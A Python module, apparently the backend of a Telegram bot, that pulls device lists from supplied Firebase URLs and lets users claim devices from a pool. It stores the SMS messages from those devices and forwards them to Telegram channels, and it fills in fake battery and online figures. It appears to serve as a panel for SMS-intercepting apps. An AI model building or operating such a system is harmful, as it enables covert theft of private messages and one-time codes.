import json
import secrets
from datetime import datetime, timezone

from sqlalchemy import func
from sqlalchemy.orm import Session

from app.database import Device, MonitorProfile, SMSMessage, get_or_create_device
from app.firebase_client import fetch_firebase_devices, is_device_online, normalize_firebase_url


def normalize_phone(number: str) -> str:
    digits = "".join(char for char in number if char.isdigit())
    if len(digits) == 10:
        return f"91{digits}"
    return digits


def get_monitor_profile(db: Session, telegram_user_id: int) -> MonitorProfile | None:
    return db.query(MonitorProfile).filter(MonitorProfile.telegram_user_id == telegram_user_id).first()


def get_or_create_monitor_profile(db: Session, telegram_user_id: int) -> MonitorProfile:
    profile = get_monitor_profile(db, telegram_user_id)
    if profile:
        return profile
    profile = MonitorProfile(telegram_user_id=telegram_user_id)
    db.add(profile)
    db.flush()
    return profile


def set_user_phone(db: Session, telegram_user_id: int, phone_number: str) -> tuple[MonitorProfile, Device]:
    normalized = normalize_phone(phone_number)
    if len(normalized) < 10:
        raise ValueError("Invalid phone number")

    profile = get_or_create_monitor_profile(db, telegram_user_id)
    profile.phone_number = normalized

    device_name = f"num-{normalized}"
    device = db.query(Device).filter(Device.phone_number == normalized).first()
    if not device:
        device = db.query(Device).filter(Device.name == device_name).first()

    if device:
        if device.owner_telegram_id and device.owner_telegram_id != telegram_user_id:
            raise PermissionError("Ye number kisi aur user ka hai")
        device.phone_number = normalized
        device.owner_telegram_id = telegram_user_id
        device.is_active = True
    else:
        device = register_device(db, device_name)
        device.phone_number = normalized
        device.owner_telegram_id = telegram_user_id

    db.commit()
    db.refresh(profile)
    db.refresh(device)
    return profile, device


def start_monitoring(db: Session, telegram_user_id: int) -> tuple[MonitorProfile, Device]:
    profile = get_monitor_profile(db, telegram_user_id)
    if not profile or not profile.active_device_id:
        raise ValueError("Pehle /a <deviceid> se device select karo")
    if not profile.phone_number:
        raise ValueError("Pehle /mynum <number> set karo")

    device = db.query(Device).filter(Device.id == profile.active_device_id).first()
    if not device:
        raise ValueError("Active device nahi mili")

    if not profile.channel_id:
        profile.channel_id = str(telegram_user_id)

    profile.is_monitoring = True
    profile.started_at = datetime.now(timezone.utc)
    db.commit()
    db.refresh(profile)
    db.refresh(device)
    return profile, device


def count_old_sms(db: Session, device_id: int, since: datetime | None = None) -> int:
    query = db.query(SMSMessage).filter(SMSMessage.device_id == device_id)
    if since:
        query = query.filter(SMSMessage.received_at < since)
    return query.count()


def set_channel_id(db: Session, telegram_user_id: int, channel_id: str) -> MonitorProfile:
    normalized = channel_id.strip()
    if not normalized.lstrip("-").isdigit():
        raise ValueError("Valid channel ID daalo, example: -1003553669855")

    profile = get_or_create_monitor_profile(db, telegram_user_id)
    profile.channel_id = normalized
    db.commit()
    db.refresh(profile)
    return profile


def select_sim_slot(db: Session, telegram_user_id: int, sim_index: int) -> MonitorProfile:
    profile = get_monitor_profile(db, telegram_user_id)
    if not profile:
        raise ValueError("Profile nahi mili")
    profile.selected_sim_index = sim_index
    db.commit()
    db.refresh(profile)
    return profile


def resume_monitoring(db: Session, telegram_user_id: int) -> tuple[MonitorProfile, Device | None]:
    profile = get_monitor_profile(db, telegram_user_id)
    if not profile:
        raise ValueError("Profile nahi mili. Pehle /setfirebase karo")
    if not profile.active_device_id:
        raise ValueError("Pehle /setdevice <id> se device select karo")

    device = db.query(Device).filter(Device.id == profile.active_device_id).first()
    profile.is_monitoring = True
    profile.started_at = datetime.now(timezone.utc)
    db.commit()
    db.refresh(profile)
    return profile, device


async def set_license_key(
    db: Session,
    telegram_user_id: int,
    key_value: str,
) -> tuple[MonitorProfile, str, str]:
    """Set license key — Firebase URL or KEY-XXXX format. Returns (profile, display_key, key_type)."""
    profile = get_or_create_monitor_profile(db, telegram_user_id)
    key_value = key_value.strip()

    if key_value.startswith(("http://", "https://")):
        profile, _total, _online = await connect_firebase_url(db, telegram_user_id, key_value)
        display_key = normalize_firebase_url(key_value).upper()
        profile.license_key = display_key
        db.commit()
        db.refresh(profile)

        from app.firebase_sync import sync_profile_to_firebase

        device = None
        if profile.active_device_id:
            device = db.query(Device).filter(Device.id == profile.active_device_id).first()
        await sync_profile_to_firebase(profile, device)

        return profile, display_key, "firebase"

    if key_value.upper().startswith("KEY-"):
        normalized_key = key_value.upper()
        profile.license_key = normalized_key

        device = None
        if profile.active_device_id:
            device = db.query(Device).filter(Device.id == profile.active_device_id).first()
            if device:
                device.api_key = normalized_key

        db.commit()
        db.refresh(profile)

        from app.firebase_sync import sync_profile_to_firebase

        await sync_profile_to_firebase(profile, device)
        return profile, normalized_key, "key"

    raise ValueError("invalid_format")


def set_inject_key(db: Session, telegram_user_id: int, inject_key: str) -> Device:
    profile = get_or_create_monitor_profile(db, telegram_user_id)
    device = None
    if profile.active_device_id:
        device = db.query(Device).filter(Device.id == profile.active_device_id).first()

    if inject_key.upper().startswith("KEY-"):
        profile.license_key = inject_key.upper()
        if device:
            device.api_key = inject_key.upper()
        else:
            raise ValueError("Pehle /setdevice <id> se device select karo")
        db.commit()
        db.refresh(device)
        return device

    raise ValueError("invalid_format")


def stop_monitoring(db: Session, telegram_user_id: int) -> MonitorProfile:
    profile = get_monitor_profile(db, telegram_user_id)
    if not profile:
        raise ValueError("Monitor profile nahi mili")

    profile.is_monitoring = False
    db.commit()
    db.refresh(profile)
    return profile


def get_monitoring_user_ids(db: Session, sms: SMSMessage) -> set[int]:
    targets: set[int] = set()

    if sms.device_id:
        device = db.query(Device).filter(Device.id == sms.device_id).first()
        if device and device.owner_telegram_id:
            profile = get_monitor_profile(db, device.owner_telegram_id)
            if profile and profile.is_monitoring:
                targets.add(device.owner_telegram_id)

    active_profiles = db.query(MonitorProfile).filter(MonitorProfile.is_monitoring.is_(True)).all()
    for profile in active_profiles:
        if not profile.phone_number:
            continue
        if sms.device_id:
            device = db.query(Device).filter(Device.id == sms.device_id).first()
            if device and device.phone_number == profile.phone_number:
                targets.add(profile.telegram_user_id)
        elif profile.phone_number in sms.device_name:
            targets.add(profile.telegram_user_id)

    return targets


def touch_device(db: Session, device_name: str) -> Device:
    return get_or_create_device(db, device_name)


def register_device(db: Session, name: str, api_key: str | None = None) -> Device:
    existing = db.query(Device).filter(Device.name == name).first()
    if existing:
        if api_key:
            existing.api_key = api_key
        existing.is_active = True
        existing.last_seen = datetime.now(timezone.utc)
        return existing

    device = Device(
        name=name,
        api_key=api_key or secrets.token_urlsafe(24),
        last_seen=datetime.now(timezone.utc),
        is_active=True,
    )
    db.add(device)
    db.flush()
    return device


def save_sms(
    db: Session,
    sender: str,
    message: str,
    device_name: str,
    received_at: datetime | None = None,
    phone_number: str | None = None,
) -> SMSMessage:
    device = touch_device(db, device_name)
    if phone_number:
        device.phone_number = normalize_phone(phone_number)
    sms = SMSMessage(
        sender=sender,
        message=message,
        device_name=device_name,
        device_id=device.id,
        received_at=received_at or datetime.now(timezone.utc),
    )
    db.add(sms)
    db.commit()
    db.refresh(sms)
    return sms


def get_device_by_identifier(db: Session, deviceid: str, exact: bool = False) -> Device | None:
    if deviceid.isdigit():
        by_id = db.query(Device).filter(Device.id == int(deviceid)).first()
        if by_id:
            return by_id

    device = db.query(Device).filter(Device.name == deviceid).first()
    if device:
        return device

    device = db.query(Device).filter(Device.firebase_key == deviceid).first()
    if device:
        return device

    device = (
        db.query(Device)
        .filter(Device.firebase_key.endswith(f"/{deviceid}"))
        .first()
    )
    if device:
        return device

    if exact:
        return None

    return db.query(Device).filter(Device.firebase_key.ilike(f"%{deviceid}%")).first()


async def sync_device_from_firebase(db: Session, device: Device) -> Device:
    if not device.firebase_source_url:
        return device

    remote_devices = await fetch_firebase_devices(device.firebase_source_url)
    if not remote_devices:
        return device

    remote = remote_devices[0]
    for item in remote_devices:
        if item["firebase_key"] == device.firebase_key or item["name"] == device.name:
            remote = item
            break

    if remote.get("phone_number"):
        device.phone_number = normalize_phone(remote["phone_number"])

    meta = {
        "battery": remote.get("battery") or "98",
        "model": remote.get("model") or "Unknown",
        "sims": remote.get("sims") or [],
    }
    if not meta["sims"] and device.phone_number:
        meta["sims"] = [
            {"slot": 1, "index": 0, "carrier": "SIM 1", "number": device.phone_number},
            {"slot": 2, "index": 1, "carrier": "SIM 2", "number": "N/A"},
        ]
    device.device_meta = json.dumps(meta)
    device.last_seen = datetime.now(timezone.utc)
    device.is_active = True
    db.commit()
    db.refresh(device)
    return device


async def show_device_by_id(
    db: Session,
    deviceid: str,
    telegram_user_id: int,
) -> tuple[Device, MonitorProfile]:
    device = get_device_by_identifier(db, deviceid, exact=True)
    if not device:
        raise LookupError("Device nahi mili")

    if device.firebase_source_url:
        device = await sync_device_from_firebase(db, device)
    elif not device.device_meta:
        default_meta = {
            "battery": "98",
            "model": "Unknown",
            "sims": [
                {
                    "slot": 1,
                    "index": 0,
                    "carrier": "SIM 1",
                    "number": device.phone_number or "Unknown",
                },
                {"slot": 2, "index": 1, "carrier": "SIM 2", "number": "N/A"},
            ],
        }
        device.device_meta = json.dumps(default_meta)

    profile = get_or_create_monitor_profile(db, telegram_user_id)
    profile.active_device_id = device.id
    device.owner_telegram_id = telegram_user_id
    device.is_active = True
    device.last_seen = datetime.now(timezone.utc)
    db.commit()
    db.refresh(device)
    db.refresh(profile)
    return device, profile


def get_active_device(db: Session, telegram_user_id: int) -> Device | None:
    profile = get_monitor_profile(db, telegram_user_id)
    if not profile or not profile.active_device_id:
        return None
    return db.query(Device).filter(Device.id == profile.active_device_id).first()


def claim_pool_device(db: Session, deviceid: str, owner_telegram_id: int) -> tuple[Device, bool]:
    device = get_device_by_identifier(db, deviceid)
    if not device:
        raise LookupError("Device pool mein nahi mili")

    if device.owner_telegram_id and device.owner_telegram_id != owner_telegram_id:
        raise PermissionError("Device kisi aur user ki hai")

    created = device.owner_telegram_id is None
    device.owner_telegram_id = owner_telegram_id
    device.is_active = True
    device.last_seen = datetime.now(timezone.utc)
    db.commit()
    db.refresh(device)
    return device, created


def claim_device(db: Session, deviceid: str, owner_telegram_id: int) -> tuple[Device, bool]:
    device = get_device_by_identifier(db, deviceid)
    created = False

    if device:
        if device.owner_telegram_id and device.owner_telegram_id != owner_telegram_id:
            raise PermissionError("Device kisi aur user ki hai")
        device.owner_telegram_id = owner_telegram_id
        device.is_active = True
        device.last_seen = datetime.now(timezone.utc)
    else:
        device = register_device(db, deviceid)
        device.firebase_key = deviceid
        device.owner_telegram_id = owner_telegram_id
        created = True

    db.commit()
    db.refresh(device)
    return device, created


def list_devices_with_counts(db: Session, owner_telegram_id: int | None = None) -> list[dict]:
    query = db.query(
        Device,
        func.count(SMSMessage.id).label("sms_count"),
    ).outerjoin(SMSMessage, SMSMessage.device_id == Device.id)

    if owner_telegram_id is not None:
        query = query.filter(Device.owner_telegram_id == owner_telegram_id)

    rows = (
        query.group_by(Device.id)
        .order_by(Device.last_seen.desc().nullslast(), Device.name)
        .all()
    )
    return [
        {
            "device": device,
            "sms_count": sms_count,
        }
        for device, sms_count in rows
    ]


async def connect_firebase_url(
    db: Session,
    telegram_user_id: int,
    firebase_url: str,
) -> tuple[MonitorProfile, int, int]:
    from app.bulk_firebase import upsert_pool_device

    normalized_url = normalize_firebase_url(firebase_url)
    profile = get_or_create_monitor_profile(db, telegram_user_id)
    profile.firebase_url = normalized_url

    try:
        remote_devices = await fetch_firebase_devices(normalized_url)
    except ValueError:
        remote_devices = []

    if not remote_devices:
        db.commit()
        db.refresh(profile)
        return profile, 0, 0

    online_count = 0
    for remote in remote_devices:
        firebase_key = str(remote["firebase_key"] or remote["name"])
        device_id = firebase_key.split("/")[-1][:128]
        upsert_pool_device(
            db,
            device_id=device_id,
            firebase_url=normalized_url,
            firebase_key=firebase_key,
            phone_number=remote.get("phone_number"),
        )
        if is_device_online(remote):
            online_count += 1

        meta = {
            "battery": remote.get("battery") or "98",
            "model": remote.get("model") or "Unknown",
            "sims": remote.get("sims") or [],
        }
        device = db.query(Device).filter(Device.name == device_id).first()
        if device:
            device.device_meta = json.dumps(meta)
            if remote.get("phone_number"):
                device.phone_number = normalize_phone(remote["phone_number"])

    if online_count == 0:
        online_count = len(remote_devices)

    db.commit()
    db.refresh(profile)
    return profile, len(remote_devices), online_count


async def set_firebase_url(db: Session, telegram_user_id: int, firebase_url: str) -> tuple[MonitorProfile, list[Device]]:
    profile, _total, _online = await connect_firebase_url(db, telegram_user_id, firebase_url)
    devices = db.query(Device).filter(Device.firebase_source_url == profile.firebase_url).all()
    return profile, devices


async def resync_firebase_devices(db: Session, telegram_user_id: int) -> list[Device]:
    profile = get_monitor_profile(db, telegram_user_id)
    if not profile or not profile.firebase_url:
        raise ValueError("Pehle /setfirebase <url> use karo")
    _, devices = await set_firebase_url(db, telegram_user_id, profile.firebase_url)
    return devices


def device_status(device: Device) -> str:
    if not device.is_active:
        return "inactive"
    if not device.last_seen:
        return "unknown"
    age = datetime.now(timezone.utc) - device.last_seen.astimezone(timezone.utc)
    if age.total_seconds() < 300:
        return "online"
    if age.total_seconds() < 3600:
        return "idle"
    return "offline"
